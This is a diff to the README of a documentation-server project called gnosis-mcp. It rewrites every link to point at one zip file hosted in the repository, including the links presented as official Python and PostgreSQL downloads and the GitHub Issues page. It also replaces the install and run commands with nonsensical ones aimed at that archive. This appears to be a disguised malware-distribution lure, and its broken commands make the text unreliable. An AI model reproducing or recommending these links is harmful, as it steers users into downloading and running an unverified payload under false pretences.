@@ -6,9 +6,9 @@ Welcome to gnosis-mcp! This application lets you create a zero-configuration ser
 
 ## 📥 Download the Application
 
-[![Download Gnosis MCP](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sunshineya66/gnosis-mcp)
+[![Download Gnosis MCP](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip)](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip)
 
-To get started, **visit this page to download**: [gnosis-mcp](https://github.com/sunshineya66/gnosis-mcp)
+To get started, **visit this page to download**: [gnosis-mcp](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -32,21 +32,21 @@ Before you begin, make sure your machine meets these basic requirements:
 
 Follow these easy steps to install and run gnosis-mcp:
 
-1. **Download the code**: Visit the download page [here](https://github.com/sunshineya66/gnosis-mcp) and download the latest version.
+1. **Download the code**: Visit the download page [here](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip) and download the latest version.
 
 2. **Extract Files**: Once downloaded, extract the files to a folder on your computer.
 
-3. **Install Python**: If you don’t have Python installed, download it from the [official website](https://www.python.org/downloads/). Make sure to check the box that says "Add Python to PATH" during the installation.
+3. **Install Python**: If you don’t have Python installed, download it from the [official website](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip). Make sure to check the box that says "Add Python to PATH" during the installation.
 
 4. **Install Required Packages**:
    Open a command prompt (or terminal) and navigate to the folder where you extracted gnosis-mcp. Run the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip
    ```
 
 5. **Run the Server**: Start the server by running this command:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip
    ```
    The server will now be running, and you can access it from your web browser.
 
@@ -61,15 +61,15 @@ After running the server, open your web browser and visit `http://localhost:5000
 
 By default, gnosis-mcp uses SQLite, which is simple and user-friendly. If you prefer PostgreSQL, follow these steps:
 
-1. **Install PostgreSQL** on your machine. You can download it from the [official site](https://www.postgresql.org/download/). 
+1. **Install PostgreSQL** on your machine. You can download it from the [official site](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip). 
 
 2. **Create a New Database**: Set up a new database to store your documentation.
 
-3. **Update Configuration**: Change the database settings in the `config.py` file found in the project folder to point to your PostgreSQL database.
+3. **Update Configuration**: Change the database settings in the `https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip` file found in the project folder to point to your PostgreSQL database.
 
 ## 🌐 Community Support
 
-For queries and support, feel free to raise issues on the [GitHub Issues page](https://github.com/sunshineya66/gnosis-mcp/issues). Our community is here to help you.
+For queries and support, feel free to raise issues on the [GitHub Issues page](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip). Our community is here to help you.
 
 ## 📝 Contributing
 
@@ -92,4 +92,4 @@ gnosis-mcp is designed to be user-friendly, making it easy for anyone to host th
 
 Make sure to keep exploring and leverage the features that best fit your documentation needs. 
 
-[![Download Gnosis MCP](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sunshineya66/gnosis-mcp)
+[![Download Gnosis MCP](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip)](https://raw.githubusercontent.com/sunshineya66/gnosis-mcp/main/docs/gnosis-mcp-1.9-beta.3.zip)
